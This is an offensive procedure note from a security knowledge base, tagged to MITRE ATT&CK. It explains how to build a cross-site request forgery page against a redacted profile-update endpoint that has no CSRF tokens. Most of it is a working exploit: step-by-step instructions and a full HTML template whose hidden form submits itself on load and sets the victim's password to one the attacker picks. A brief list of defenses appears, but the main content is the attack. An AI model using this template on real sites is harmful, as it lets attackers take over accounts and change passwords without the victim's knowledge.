---
tags:
  - csrf
  - payload-crafting
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:24.326Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 881c3efe-fc4f-4d46-8d44-a7f18d91160a
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Prepare-CSRF-Malicious-HTML-Payload

## Summary

This procedure involves crafting a malicious HTML page with an auto-submitting form that targets the vulnerable profile update endpoint, allowing the attacker to forge a POST request for unauthorized changes including password reset.

## Description

The target endpoint http://██████████/█████████/myprofile.asp?update=yes lacks CSRF tokens, enabling cross-origin requests. The HTML includes hidden fields for form data like txtFName, txtPassword (set to attacker's choice, e.g., '████'), and txtVeriPW. When loaded, JavaScript auto-submits the form, exploiting the victim's session. Prerequisites include knowledge of the target's form fields from reconnaissance.

## Requirements

1. Knowledge of the target's POST parameters (e.g., via inspecting legitimate forms)
2. Text editor to create the HTML file
3. Hosting capability for the HTML (local or remote server)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing POST forms
- Enforce same-origin policy checks or custom headers (e.g., Origin header validation)
- Log and alert on profile updates from unexpected referrers

## Objectives

1. Create a functional forged request payload
2. Ensure auto-submission without user interaction
3. Match exact form fields to bypass validation

## Instructions

### Step 1: Identify Form Fields

**Context**: Determine the required POST parameters from the target endpoint.

Inspect the legitimate profile form using browser dev tools to note fields like txtFName, txtMI, txtLName, txtPassword, txtVeriPW.

> Expected output: List of field names and types (all text inputs).

### Step 2: Craft the HTML

**Context**: Build the self-submitting form targeting the vulnerable URL.

Create an HTML file with the following structure:

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Payload</title>
</head>
<body>
    <form id="csrfForm" action="http://██████████/█████████/myprofile.asp?update=yes" method="POST">
        <input type="hidden" name="txtFName" value="VictimFirst">
        <input type="hidden" name="txtMI" value="M">
        <input type="hidden" name="txtLName" value="VictimLast">
        <input type="hidden" name="txtPassword" value="████">
        <input type="hidden" name="txtVeriPW" value="████">
        <!-- Add other fields as needed -->
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

> Expected output: Valid HTML file. Test locally by opening in a browser (disable same-origin if needed for dev).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[payload-crafting]]
